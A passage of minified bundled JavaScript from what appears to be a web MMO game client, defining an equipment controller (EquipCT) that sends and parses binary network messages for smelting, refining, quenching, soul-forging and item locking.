n=i(14),o=i(6),s=i(4),a=i(40),r=i(48),l=i(13),h=i(69),u=i(2),p=i(103),d=i(0),c=i(10),f=i(22),g=i(17),m=i(62),v=i(24),y=i(19),C=i(153),T=i(226),b=i(121),w=i(26),I=function(t){function e(){var e=t.call(this)||this;return e.thunderUnlockIndex=[],e.extAttrs=[],e.quily=[],e.clearTab=null,e.clearEquipUid=null,e.soulAttr=[],e.soulQuily=[],e.sacrificeArr=[],e.beforeIndex=0,e.isRequested=!1,e.isQuenching=0,e.tempDuanPoPro={skillId:0,preId:0,proArr:[]},e.quenchingAttr=[],e.quenchineTime=0,e.isFind=!1,e.tjRp=new g.RedPoint,e.animalsRp=new g.RedPoint,e.sysId=PackageID.Equip,e.regNetMsg(1,e.doUpDataEquip),e.regNetMsg(2,e.postSmeltEquipComplete),e.regNetMsg(3,e.doGrewupEquipResult),e.regNetMsg(4,e.doGrewupEquipResult),e.regNetMsg(5,e.postAddSpirit),e.regNetMsg(6,e.takeoffEquipPost),e.regNetMsg(8,e.postZhiZunUpgrade),e.regNetMsg(61,e.onEquipClearInfo),e.regNetMsg(62,e.onEquipClear),e.regNetMsg(63,e.onEquipClearKeep),e.regNetMsg(64,e.onEquipQuenching),e.regNetMsg(67,e.postLock),e.regNetMsg(68,e.donEquipSoul),e.regNetMsg(69,e.doEquipSoulKeep),e.regNetMsg(70,e.doEquipCasting),e.regNetMsg(71,e.doCastingInfo),e.regNetMsg(72,e.doQuenchingReset),e.regNetMsg(73,e.doEquipsacrificeReset),e.regNetMsg(74,e.doEquipsacrificeUpdate),e.regNetMsg(75,e.doEquipSacrificeBreakUp),e.regNetMsg(76,e.doEquipSacrificeSave),e.regNetMsg(77,e.doEquipDuanPoBack),e.regNetMsg(78,e.doEquipDuanPoSave),observe(e,e.upDateRp,l.SubRoles.ins().doSubRole),e.isRequested=!1,e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendEquipCasting=function(t,e,i,n){var o=this.getBytes(70);o.writeByte(t),o.writeDouble(e),o.writeDouble(i),o.writeInt(n),this.sendToServer(o)},e.prototype.doEquipCasting=function(t){C.CastingData.ins.doEquipCasting(t)},e.prototype.doCastingInfo=function(t){C.CastingData.ins.doCastingInfo(t)},e.prototype.doQuenchingReset=function(t){for(var e,i=t.readDouble(),n=[],s=0;8>s;s++)n[s]={},n[s].key=t.readInt(),n[s].value=t.readInt();for(var a=null===(e=l.SubRoles.ins().getSubRoleByIndex(0))||void 0===e?void 0:e.equipsData,s=0;s<(null===a||void 0===a?void 0:a.length);s++){var r=a[s].item;if(r&&r.handle==i){for(var h=r.att,u=0;u<h.length;u++){var p=h[u];p.type=n[u].key,p.value=n[u].value}return void this.postQuenching()}}for(var d=o.BagCT.ins().bagModel[o.BagCT.BAG_TYPE_EQUIP],s=0;s<d.length;s++)if(d[s]&&d[s].handle==i){for(var h=d[s].att,c=0;c<h.length;c++){var p=h[c];p.type=n[c].key,p.value=n[c].value}return void this.postQuenching()}},e.prototype.upgradeZhiZunEquip=function(t,e){var i=this.getBytes(8);i.writeShort(t),i.writeShort(e),this.sendToServer(i)},e.prototype.doEquipsacrificeReset=function(t){this.sacrificeArr=[];for(var e=t.readByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readByte(),s=t.readByte(),a=new T.EquipSacrificeData;a.pos=n,a.lv=o;for(var r=0;s>r;r++){var l=new T.EquipSacrificeAttData;l.attIndex=t.readByte(),l.attType=t.readInt(),l.attValue=t.readInt(),a.attArr.push(l)}this.sacrificeArr[n+""]=a}},e.prototype.doEquipsacrificeUpdate=function(t){var e=t.readByte(),i=t.readByte(),n=new T.EquipSacrificeData;n.pos=e;for(var o=0;i>o;o++){var s=new T.EquipSacrificeAttData;s.attIndex=t.readByte(),s.attType=t.readInt(),s.attValue=t.readInt(),n.attArr.push(s)}this.keepSacrifice=n},e.prototype.getAttData=function(t,e){for(var i=[],n=0;n<t.length;n++){var o=new f.AttributeData;o.type=t[n],o.value=0,i.push(o)}for(var n=0;n<i.length;n++)for(var s=0;s<e.length;s++)e[s].attType==i[n].type&&(i[n].value=e[s].attValue);return i},e.prototype.changetabEquip=function(){},e.prototype.doEquipSacrificeBreakUp=function(t){var e=t.readByte(),i=t.readByte();return this.sacrificeArr[e].lv=i,!0},e.prototype.doEquipSacrificeSave=function(t){var e=t.readByte(),i=t.readByte(),n=t.readByte(),o=new T.EquipSacrificeData;o.lv=i,o.pos=e;for(var s=0;n>s;s++){var a=new T.EquipSacrificeAttData;a.attIndex=t.readByte(),a.attType=t.readInt(),a.attValue=t.readInt(),o.attArr.push(a)}this.keepSacrifice=o,this.sacrificeArr[e]=this.keepSacrifice},e.prototype.onEquipClearInfo=function(t){for(var e,i,n=t.readInt(),s=0;n>s;s++){var a=t.readDouble(),r=t.readInt(),h=o.BagCT.ins().getBagGoodsByHandle(1,a);if(h)h.xilian=r;else for(var u=l.SubRoles.ins().getSubRoleByIndex(0).equipsData,p=0;p<u.length;p++)if((null===(e=u[p])||void 0===e?void 0:e.item)&&(null===(i=u[p])||void 0===i?void 0:i.item.handle)==a){u[p].item.xilian=r;break}}this.postEquipClearInfo()},e.prototype.postEquipClearInfo=function(){},e.prototype.sendeMoveEquip=function(t){var e=this.getBytes(6);e.writeShort(0),e.writeShort(t),this.sendToServer(e)},e.prototype.takeoffEquipPost=function(t){var e=(t.readShort(),t.readShort(),new a.ItemData);return e.parser(t),e.handle},e.prototype.postBagItemAdd=function(t){return t},e.prototype.sendEquipClearInfo=function(t,e){var i=this.getBytes(61);i.writeInt(t.length);for(var n=0;n<t.length;n++){i.writeDouble(t[n]);var o=e[n];"undefined"==typeof o&&(o=e[0]),i.writeByte(o)}this.sendToServer(i)},e.prototype.onEquipClear=function(t){var i,n=t.readDouble(),s=t.readByte(),a=t.readInt();if(0>s){var r=o.BagCT.ins().getBagGoodsByHandle(1,n);r&&(r.xilian=a,a>0&&!r.lock&&e.ins().sendEquipLock(n,s))}else{var h=null===(i=l.SubRoles.ins().getSubRoleByIndex(0).equipsData[s])||void 0===i?void 0:i.item;h&&(h.xilian=a,a>0&&!h.lock&&e.ins().sendEquipLock(n,s))}this.extAttrs=[],this.quily=[];for(var u=0;4>u;u++){var p=t.readInt(),d=t.readInt();this.extAttrs[2*u]=new f.AttributeData,this.extAttrs[2*u].type=p,this.extAttrs[2*u].value=d;var c=t.readInt();this.quily[2*u]=c}for(var u=0;4>u;u++){var p=t.readInt(),d=t.readInt();this.extAttrs[2*u+1]=new f.AttributeData,this.extAttrs[2*u+1].type=p,this.extAttrs[2*u+1].value=d;var c=t.readInt();this.quily[2*u+1]=c}this.postEquipClear()},e.prototype.sendSaveEquip=function(t,e){var i=this.getBytes(63);i.writeDouble(t),i.writeByte(e),this.sendToServer(i)},e.prototype.onEquipClearKeep=function(t){t.readDouble();this.extAttrs=[],this.quily=[],this.postEquipClear()},e.prototype.sendEquipClear=function(t,e,i,n,o){var s=this.getBytes(62);s.writeDouble(t),s.writeByte(e),s.writeByte(i),s.writeByte(n),s.writeByte(o),this.sendToServer(s)},e.prototype.postEquipClear=function(){},e.prototype.postChangeTabClear=function(){},e.prototype.sendQuenching=function(t,e,i,n,o,s){this.clEquipId=t,this.clEquipIdx=e;var a=this.getBytes(64);a.writeDouble(t),a.writeByte(e),a.writeByte(i),a.writeDouble(n),a.writeShort(o),a.writeShort(s),this.sendToServer(a)},e.prototype.onEquipQuenching=function(t){var e=(t.readDouble(),t.readByte(),t.readByte());if(this.quenchingAttr=[],0!=e){for(var i=0;8>i;i++){var n=new f.AttributeData;n.type=t.readInt(),n.value=t.readInt(),this.quenchingAttr.push(n)}2==e&&(this.quenchineTime=t.readByte())}this.isQuenching=e,this.postQuenching()},e.prototype.postQuenching=function(){},e.prototype.saveOrAbandonQuenching=function(t,e,i){var n=this.getBytes(65);n.writeDouble(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.sendQuenchingInfo=function(t,e){var i=this.getBytes(66);
i.writeDouble(t),i.writeByte(e),this.quenchingAttr=[],this.sendToServer(i)},e.prototype.isNoShow=function(t,i){if(void 0===i&&(i=!0),t){if(i&&-1!=e.NoshowItemIdArr.indexOf(t.id))return!0;var n=d.GlobalConfig.ItemDescConfig[t.descIndex];if(n)return n.subType>=10?!0:void 0}},e.prototype.getAllBodyBestEquip=function(){for(var t=[],e=l.SubRoles.ins().getSubRoleByIndex(0),i=e.getEquipLen(),n=0;i>n;n++){var o=e.getEquipByIndex(n),s=o.item;this.isNoShow(s.itemConfig)||this.isBestEquip(s)&&t.push(s)}return t},e.prototype.getAllBestEquip=function(){for(var t=[],e=o.BagCT.ins().bagModel[o.BagCT.BAG_TYPE_EQUIP],i=0;i<e.length;i++){var n=e[i];if(!this.isNoShow(n.itemConfig)){var s=this.isBestEquip(n);s&&t.push(n)}}return t},e.prototype.nextAttrIsTs=function(t,e){for(var i=0,n=0,o=0;o<t.length;o++){var s=d.GlobalConfig.AttrPowerConfig[t[o].type];i+=s.pow*t[o].value}for(var o=0;o<e.length;o++){var s=d.GlobalConfig.AttrPowerConfig[e[o].type];n+=s.pow*e[o].value}return n>i},e.prototype.isBestEquip=function(t){var e=t.att;if(!e)return!1;for(var i=0;i<e.length;i++){var n=e[i];if(0!=n.type)return!0}return!1},e.prototype.getBestNum=function(t){var e=0;if(!t)return 0;for(var i in r.Role.translate)for(var n=0;n<t.length;n++){var o=t[n];o.value&&o.type==r.Role.translate[i]&&(e+=o.value)}return e},e.prototype.postGiveUp=function(){},e.prototype.sendSmeltEquip=function(t,e){var i=this.getBytes(2);i.writeInt(t);var n=i.position;i.position+=4;for(var o=0,s=0;s<e.length;s++)null!=e[s]&&(i.writeDouble(e[s].handle),++o);return 0==o?!1:(i.position=n,i.writeInt(o),this.sendToServer(i),!0)},e.prototype.doUpDataEquip=function(t){var e=t.readShort(),i=t.readShort(),n=new a.ItemData;n.parser(t);var o=l.SubRoles.ins().getSubRoleByIndex(e),s=o.getEquipByIndex(i);s.item=n,this.postEquipChange(e,i),this.postEquipChange2(n.handle)},e.prototype.postEquipChange=function(t,e){return h.SoundUtil.play(h.SoundEnum.EQUIP),[t,e]},e.prototype.postEquipChange2=function(t){return t},e.prototype.postSmeltEquipComplete=function(t){return __awaiter(this,void 0,void 0,function(){var e,n,o,s,a,r;return __generator(this,function(l){switch(l.label){case 0:if(e=t.readInt(),0==e)return u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:熔炼失败！|")),[2];for(n=t.readInt(),o=t.readInt(),s=[],a=0;o>a;a++)r={},r.itemId=t.readInt(),r.count=t.readInt(),s.push(r);return o>0&&200007==s[0].itemId?[4,Promise.resolve().then(function(){return i(287)})]:[3,2];case 1:l.sent().ShowImgCT.ins().showImg(s[0].itemId+"_png",{horizontalCenter:150,y:p.StageUtils.ins().getHeight()-80}),l.label=2;case 2:return[2,s]}})})},e.contrastEquip=function(t,e){if(!t||0==t.handle)return e;if(!e||0==e.handle)return t;var i=t.point,n=e.point;return n>i?e:t},e.prototype.postEquipCheckList=function(t){return t},e.prototype.getEquipsByJobNPos=function(t,e){for(var i=l.SubRoles.ins().subRolesLen,n=0;i>n;n++){var o=l.SubRoles.ins().getSubRoleByIndex(n);if(o.job==t)return o.getEquipByIndex(e)}return null},e.prototype.checkEquipsIsWear=function(t){for(var e=l.SubRoles.ins().subRolesLen,i=0;e>i;i++){var n=l.SubRoles.ins().getSubRoleByIndex(i);if(n.job==c.ItemUtil.getJob(t.itemConfig)||0==c.ItemUtil.getJob(t.itemConfig))for(var o=n.getEquipLen(),s=0;o>s;s++)if(t.handle==n.getEquipByIndex(s).item.handle)return!0}return!1},e.prototype.checkEquipIsCanWear=function(t,e){var i=l.SubRoles.ins().getSubRoleByIndex(0),n=d.GlobalConfig.ItemConfig[t];return i.job!=c.ItemUtil.getJob(n)&&0!=c.ItemUtil.getJob(n)||s.ActorCC.level<((null===n||void 0===n?void 0:n.level)||0)-this.cutEquiplv(e)||b.LhCT.ins().lv<((null===n||void 0===n?void 0:n.lhLevel)||0)-this.cutEquipLhLv(e)||w.ZsCT.ins().stage<((null===n||void 0===n?void 0:n.zsLevel)||0)?!1:!0},e.prototype.cutEquiplv=function(t){if(!t)return 0;if(!t.supExtAtt)return 0;for(var e=0,i=t.supExtAtt||[],n=0;n<i.length;n++){var o=i[n];158==o.type&&(e+=o.value)}return e},e.prototype.cutEquipLhLv=function(t){var e,i;if(!t)return 0;if(!t.masterEntryArr)return 0;for(var n=0,o=t.masterEntryArr,s=0;s<o.length;s++){var a=d.GlobalConfig.MasterSuitEquipEntryConfig[o[s]];if(a&&3==(null===(e=a.special)||void 0===e?void 0:e.type))n+=a.special.param?a.special.param:0;else if(a&&4==(null===(i=a.special)||void 0===i?void 0:i.type)){n=t.itemConfig.lhLevel;break}}return n},e.prototype.doGrewupEquipResult=function(t){t.readShort(),t.readInt(),t.readInt()},e.prototype.sendGrewupEquip=function(t,e){var i=this.getBytes(3);i.writeShort(t),i.writeShort(e),this.sendToServer(i)},e.prototype.getDescCfgIdByType=function(t,e){var i=d.GlobalConfig.ItemDescConfig;for(var n in i)if(i[n].type==t&&i[n].subType==e)return i[n].id;return null},e.prototype.sendMixEquip=function(t,e,i){var n=this.getBytes(4);n.writeShort(t),n.writeInt(e),n.writeInt(i),this.sendToServer(n)},e.prototype.checkRedPoint=function(t,e){for(var i=o.BagCT.ins().getBagEquipsByQuality(t),n=i.length,s=0;n>s;s++){var a=void 0,r=void 0;if(!isNaN(e)&&(a=c.ItemUtil.getJob(i[s].itemConfig),r=l.SubRoles.ins().getSubRoleByIndex(e),r.job!=a))return!1;if(!r)return!1}return!1},e.prototype.requestAddSpirit=function(t,e,i){var n=this.getBytes(5);n.writeShort(t),n.writeShort(e),n.writeShort(i.length);for(var o=0;o<i.length;o++)n.writeDouble(i[o]);this.sendToServer(n)},e.prototype.postAddSpirit=function(t){var e=t.readShort(),i=t.readShort(),n=t.readShort(),o=t.readInt(),s=l.SubRoles.ins().getSubRoleByIndex(e).getEquipByIndex(i);s.spiritLv=n,s.spiritExp=o},e.prototype.postZhiZunUpgrade=function(t){var e=t.readShort(),i=t.readShort(),n=t.readShort(),o=l.SubRoles.ins().getSubRoleByIndex(e).getEquipByIndex(i);o.soulLv=n},e.prototype.sendEquipLock=function(t,e){var i=this.getBytes(67);i.writeDouble(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postLock=function(t){for(var e,i,n=t.readDouble(),s=t.readByte(),a=(t.readByte(),null===(e=l.SubRoles.ins().getSubRoleByIndex(0))||void 0===e?void 0:e.equipsData),r=0;r<(null===a||void 0===a?void 0:a.length);r++){var h=a[r].item;if(h&&h.handle==n)return void(h.lock=!!s)}for(var u=o.BagCT.ins().bagModel[o.BagCT.BAG_TYPE_EQUIP],r=0;r<u.length;r++)if(u[r]&&u[r].handle==n)return void(u[r].lock=!!s);for(var p=null===(i=l.SubRoles.ins().getSubRoleByIndex(0))||void 0===i?void 0:i.masterEquipDatas,r=0;r<p.length;r++)if(p[r]&&p[r].handle==n)return void(p[r].lock=!!s)},e.prototype.standardAttrs=function(t){var e=[];if(t&&0!=t.length)for(var i=0;4>i;i++){var n=t[i],o=t[i+4];e.push(n),e.push(o)}return e},e.prototype.getWearEquipItems=function(t){void 0===t&&(t=0);for(var i,n=[],o=l.SubRoles.ins().getSubRoleByIndex(0),s=0;10>s;s++){var a=o.getEquipByIndex(s);i=a.item,e.ins().isNoShow(i.itemConfig)||a.item.configID&&a.item.quality>t&&n.push(i)}return n},e.prototype.getBagEquipItems=function(t){void 0===t&&(t=0);for(var i=o.BagCT.ins().getBagEquipsByMinQuality(0),n=[],s=0;s<i.length;s++)e.ins().isNoShow(i[s].itemConfig)||i[s].quality<=t||n.push(i[s]);return i},e.prototype.sendEquipXiLianNum=function(){if(!this.isRequested){for(var t=this.getWearEquipItems(),i=this.getBagEquipItems(),n=[],o=[],s=[],a=[],r=0;r<t.length;r++)n.push(t[r].handle),o.push(-1);for(var r=0;r<i.length;r++)s.push(i[r].handle),a.push(i[r].subType2);e.ins().sendEquipClearInfo(n,o),e.ins().sendEquipClearInfo(s,a),this.isRequested=!0}},e.prototype.sendSoul=function(t,e,i){var n=this.getBytes(68);n.writeDouble(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.donEquipSoul=function(t){t.readDouble();this.soulAttr=[],this.soulQuily=[];for(var e=0;4>e;e++){var i=t.readInt(),n=t.readInt();this.soulAttr[2*e]=new f.AttributeData,this.soulAttr[2*e].type=i,this.soulAttr[2*e].value=n;var o=t.readInt();this.soulQuily[2*e]=o}for(var e=0;4>e;e++){var i=t.readInt(),n=t.readInt();this.soulAttr[2*e+1]=new f.AttributeData,this.soulAttr[2*e+1].type=i,this.soulAttr[2*e+1].value=n;var o=t.readInt();this.soulQuily[2*e+1]=o}this.postEquipSoul()},e.prototype.postEquipSoul=function(){},e.prototype.saveSoul=function(t,e){var i=this.getBytes(69);i.writeDouble(t),this.sendToServer(i)},e.prototype.resetQuenching=function(t){var e=this.getBytes(72);e.writeDouble(t),this.sendToServer(e)},e.prototype.sacrificeLock=function(t,e){var i=this.getBytes(74);i.writeByte(t),i.writeByte(e.length);for(var n=0;n<e.length;n++)i.writeShort(e[n]);this.sendToServer(i)},e.prototype.sacrificeThrough=function(t){var e=this.getBytes(75);e.writeByte(t),this.sendToServer(e)},e.prototype.sacrificeSave=function(t){var e=this.getBytes(76);e.writeByte(t),this.sendToServer(e)},e.prototype.doEquipSoulKeep=function(t){this.soulAttr=[],this.soulQuily=[];t.readDouble();this.postEquipSoul()},e.prototype.upDateRp=function(){this.initRps(),this.initAnimalsRps()},e.prototype.getDuanPoPreAttrList=function(t){if(!t||!t.equipDuanPoPro||!t.equipDuanPoPro.skillId)return[];if(!this._duanPoPreDic){this._duanPoPreDic={};var e=d.GlobalConfig.EquipForgeSoulConfig;for(var i in e){var n=e[i];if(n){this._duanPoPreDic[n.castSoulprefix]||(this._duanPoPreDic[n.castSoulprefix]=[]);var o=Math.floor(n.id/1e4);this._duanPoPreDic[n.castSoulprefix].indexOf(o)<0&&this._duanPoPreDic[n.castSoulprefix].push(o)}}}if(!(t&&t.equipDuanPoPro&&t.equipDuanPoPro.skillId&&t.equipDuanPoPro.preId))return[];var a=[],r=d.GlobalConfig.ItemConfig[t.configID],l=d.GlobalConfig.ItemDescConfig[null===r||void 0===r?void 0:r.descIndex],h=(null===l||void 0===l?void 0:l.job)||s.ActorCC.jobId,u=t.equipDuanPoPro.skillId,p=t.equipDuanPoPro.preId,c=this._duanPoPreDic[p];if(c&&c.length>0)for(var f=0,g=c.length;g>f;f++){var m=1,v=1e4*c[f]+m,y=d.GlobalConfig.EquipForgeSoulConfig[v];if(!(y.job>0&&y.job!=h||u!=y.skillGroup)){for(var C=d.GlobalConfig.ForgeSoulReviseConfig[v];C;)m++,v=1e4*c[f]+m,C=d.GlobalConfig.ForgeSoulReviseConfig[v];m--,v=1e4*c[f]+m,C=d.GlobalConfig.ForgeSoulReviseConfig[v];var T=this.getLimitCount(c[f]),b=C.desc?C.desc.concat(""):"",w=/\%s(\d+)\%/g;b=b.replace(w,"");var I=/\s{2,}/g;b=b.replace(I," "),a.push({attrName:b,maxV:C.value,maxCnt:T})}}return a},e.prototype.getLimitCount=function(t){var e=d.GlobalConfig.EquipAffixBaseConfig.forgeSoulGroupLimit;if(!e)return 0;for(var i in e){var n=e[i];if(n&&n.group==t)return n.count}return 0},e.prototype.getDuanPoEquipList=function(t){void 0===t&&(t=0);var i=d.GlobalConfig.EquipAffixBaseConfig.forgeSoulQualityLimit,n=[];if(0==t)for(var s=l.SubRoles.ins().getSubRoleByIndex(0),a=0;10>a;a++){var r=s.getEquipByIndex(a),h=r.item;e.ins().isNoShow(h.itemConfig)||h.quality&&h.quality>=i&&n.push(h)}else for(var u=o.BagCT.ins().getBagEquipsByMinQuality(0),a=0;a<u.length;a++)e.ins().isNoShow(u[a].itemConfig)||c.ItemUtil.isMasterEquip(u[a].itemConfig)||u[a].quality&&u[a].quality>=i&&n.push(u[a]);return n},e.prototype.getDuanPoSuitList=function(){for(var t={},i=[],n=l.SubRoles.ins().getSubRoleByIndex(0),o=0;10>o;o++){var s=n.getEquipByIndex(o),a=s.item;if(a&&!e.ins().isNoShow(a.itemConfig)&&a.equipDuanPoPro&&a.equipDuanPoPro.proArr.length>0)for(var r=0,h=a.equipDuanPoPro.proArr.length;h>r;r++){var u=a.equipDuanPoPro.proArr[r];i.push(u)}}for(var p in i){var c=d.GlobalConfig.ForgeSoulReviseConfig[i[p]];if(c){var f=Math.floor(c.id/1e4);t[f]||(t[f]=[]),t[f].push(c)}}return t},e.prototype.getSuitActiviteCnt=function(t){for(var i=[],n=l.SubRoles.ins().getSubRoleByIndex(0),o=0;10>o;o++){var s=n.getEquipByIndex(o),a=s.item;if(a&&!e.ins().isNoShow(a.itemConfig)&&a.equipDuanPoPro&&a.equipDuanPoPro.proArr.length>0)for(var r=0,h=a.equipDuanPoPro.proArr.length;h>r;r++){var u=a.equipDuanPoPro.proArr[r],p=Math.floor(u/1e4);p==t&&i.push(u)}}return i.length},e.prototype.reqEquipDuanPo=function(t,e){var i=this.getBytes(77);i.writeDouble(t),i.writeByte(e),this.sendToServer(i)},e.prototype.doEquipDuanPoBack=function(t){this.tempDuanPoPro={skillId:0,preId:0,proArr:[]};for(var e=(t.readDouble(),0);8>e;e++){var i=t.readInt(),n=t.readByte(),o=t.readInt();i>0&&this.tempDuanPoPro.proArr.push(i),o>0&&(this.tempDuanPoPro.skillId=o),n>0&&(this.tempDuanPoPro.preId=n)}this.postDuanPoTempAttrFlus()},e.prototype.postDuanPoTempAttrFlus=function(){},e.prototype.postDuanPoAttrSave=function(){},e.prototype.reqEquipDuanPoSave=function(t){var e=this.getBytes(78);e.writeDouble(t),this.sendToServer(e)},e.prototype.doEquipDuanPoSave=function(t){for(var e=t.readDouble(),i={skillId:0,preId:0,proArr:[]},n=0;8>n;n++){var s=t.readInt(),a=t.readByte(),r=t.readInt();r>0&&(i.skillId=r),a>0&&(i.preId=a),s>0&&i.proArr.push(s)}for(var h,u=l.SubRoles.ins().getSubRoleByIndex(0),n=0;10>n;n++){var p=u.getEquipByIndex(n),d=p.item;if(d.handle==e){h=d;break}}h?h.equipDuanPoPro=i:(h=o.BagCT.ins().getBagGoodsByHandle(o.BagCT.BAG_TYPE_EQUIP,e),h&&(h.equipDuanPoPro=i)),this.tempDuanPoPro={skillId:0,preId:0,proArr:[]},this.postDuanPoAttrSave()},e.prototype.getCurSkillDesc=function(t){var e=gettext("技能：未鉴定");if(!(t&&t.equipDuanPoPro&&t.equipDuanPoPro.skillId&&t.equipDuanPoPro.preId))return e;var i=t.equipDuanPoPro.preId,n=1==i?gettext("(增幅)"):gettext("(抵抗)"),o=1e3*t.equipDuanPoPro.skillId+1,s=d.GlobalConfig.SkillsConfig[o];if(s){var a=d.GlobalConfig.SkillsDescConfig[s.desc];return a?""+a.name+n:e}return e},e.prototype.initRps=function(){var t=this,e=l.SubRoles.ins().getSubRoleByIndex(0);e&&(null===e||void 0===e?void 0:e.equipsData)&&(this.tjRp=new g.RedPoint(function(){for(var e=m.EquipPos.PowerRing,i=m.EquipPos.AnimalsRat,n=e;i>n;n++)if(t.checkTjRpByPos(n))return!0;return!1},o.BagCT.ins().postItemAdd,o.BagCT.ins().postItemDel,o.BagCT.ins().postItemChange))},e.prototype.checkTjRpByPos=function(t){var i,n=l.SubRoles.ins().getSubRoleByIndex(0),o=n.equipsData[t].item.itemConfig;if(o)i=o.id;else{var s=e.ins().getDescCfgIdByType(0,t);if(!s)return!1;var a=v.CommonUtils.getObjectByAttr(d.GlobalConfig.ItemConfig,"descIndex",s),r=100*Math.floor((null===a||void 0===a?void 0:a.id)/100);i=r}return this.checkUpTjItem(i)?!0:!1},e.prototype.checkUpTjItem=function(t){var e=d.GlobalConfig.SyntheticConfig[t];if(!e)return!1;if(!e.target[0])return!1;var i=d.GlobalConfig.ItemConfig[e.target[0].id],n=d.GlobalConfig.ItemDescConfig[i.descIndex];if((null===n||void 0===n?void 0:n.subType)>=m.EquipPos.PowerRing&&(null===n||void 0===n?void 0:n.subType)<=m.EquipPos.EquipType_SecretRecord||(null===n||void 0===n?void 0:n.subType)>=m.EquipPos.Spell&&(null===n||void 0===n?void 0:n.subType)<=m.EquipPos.Bugle){for(var o=e.cost,s=0;s<o.length;s++)if(!y.GlobalFun.checkCost(o[s].count,o[s].id,"",!1))return!1;return!0}return!1},e.prototype.initAnimalsRps=function(){var t=this,e=l.SubRoles.ins().getSubRoleByIndex(0);e&&(null===e||void 0===e?void 0:e.equipsData)&&(this.animalsRp=new g.RedPoint(function(){for(var i=m.EquipPos.AnimalsRat,n=m.EquipPos.MAX-2,s=i;n>s;s++)if(t.checkAnimalsRpByPos(s))return!0;for(var a=e.equipsData,s=i;n>s;s++)if(a[s]){var r=o.BagCT.ins().getEquipByPos(0,s);if(r.length>0&&!a[s].item.itemConfig)return!0}return!1},o.BagCT.ins().postItemAdd,o.BagCT.ins().postItemDel,o.BagCT.ins().postItemChange))},e.prototype.checkAnimalsRpByPos=function(t){var i,n=l.SubRoles.ins().getSubRoleByIndex(0),o=n.equipsData[t].item.itemConfig;if(o)i=o.id;else{var s=e.ins().getDescCfgIdByType(0,t);if(!s)return!1;var a=v.CommonUtils.getObjectByAttr(d.GlobalConfig.ItemConfig,"descIndex",s),r=100*Math.floor((null===a||void 0===a?void 0:a.id)/100);i=r}return this.checkUpAnimalsItem(i)?!0:!1},e.prototype.checkUpAnimalsItem=function(t){var e=d.GlobalConfig.SyntheticConfig[t];if(!e||!e.target[0])return!1;var i=d.GlobalConfig.ItemConfig[e.target[0].id],n=d.GlobalConfig.ItemDescConfig[i.descIndex];if((null===n||void 0===n?void 0:n.subType)<m.EquipPos.AnimalsRat||(null===n||void 0===n?void 0:n.subType)>m.EquipPos.AnimalsPig)return!1;for(var o=e.cost,s=0;s<o.length;s++)if(!y.GlobalFun.checkCost(o[s].count,o[s].id,"",!1))return!1;return!0},e.prototype.getEquipCanGetXlAttrCnt=function(t){var e=d.GlobalConfig.EquipAffixBaseConfig.attrNumsByBuality;return t<e.length?e[t]:e[0]},e.prototype.checkEquipAndTips=function(t,i,n){void 0===n&&(n=!1);var o=s.ActorCC.level,a=w.ZsCT.ins().stage,r=d.GlobalConfig.ItemConfig[t],l=r.level-e.ins().cutEquiplv(i)||0;if(r){if(!(a>=(r.zsLevel||0)&&o>=l))return 5==i.quality?void(n&&u.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:{0}）达到{1}转{2}级可穿戴|",r.name,r.zsLevel,l))):(n&&u.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:等级不足，无法穿戴|")),!1);var h=r.lhLevel-e.ins().cutEquipLhLv(i);if(b.LhCT.ins().lv<h)return n&&u.TipsCT.ins().showTips(gettext("需轮回等级达到{0}",d.GlobalConfig.SamsaraLevelConfig[r.lhLevel].lvName)),!1}return!0},e.LegendEquipNames=[gettext("武器"),gettext("头盔"),gettext("衣服"),gettext("项链"),gettext("手镯"),gettext("腰带"),gettext("戒指"),gettext("鞋子"),gettext("面甲"),gettext("护肩"),gettext("护膝"),gettext("吊坠")],e.FOEGE_MAX=10,e.NoshowItemIdArr=[205003,205004,205005,205006,205007,205008,205009,205010,205084],__decorate([post()],e.prototype,"doEquipsacrificeReset",null),__decorate([post()],e.prototype,"doEquipsacrificeUpdate",null),__decorate([post()],e.prototype,"changetabEquip",null),__decorate([post()],e.prototype,"doEquipSacrificeBreakUp",null),__decorate([post()],e.prototype,"doEquipSacrificeSave",null),__decorate([post()],e.prototype,"postEquipClearInfo",null),__decorate([post()],e.prototype,"takeoffEquipPost",null),__decorate([post()],e.prototype,"postBagItemAdd",null),__decorate([post()],e.prototype,"postEquipClear",null),__decorate([post()],e.prototype,"postChangeTabClear",null),__decorate([post()],e.prototype,"postQuenching",null),__decorate([post()],e.prototype,"postGiveUp",null),__decorate([post()],e.prototype,"postEquipChange",null),__decorate([post()],e.prototype,"postEquipChange2",null),__decorate([post()],e.prototype,"postSmeltEquipComplete",null),__decorate([post()],e.prototype,"postEquipCheckList",null),__decorate([post()],e.prototype,"postAddSpirit",null),__decorate([post()],e.prototype,"postZhiZunUpgrade",null),__decorate([post()],e.prototype,"sendEquipLock",null),__decorate([post()],e.prototype,"postLock",null),__decorate([post()],e.prototype,"postEquipSoul",null),__decorate([post()],e.prototype,"postDuanPoTempAttrFlus",null),__decorate([post()],e.prototype,"postDuanPoAttrSave",null),e}(n.BaseSystem);e.EquipCT=I,window.EquipCT=I,__reflect(I.prototype,"EquipCT",[]),Systemap.EquipCT=function(){return I.ins()},window.EquipCT=I},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemType=void 0;var 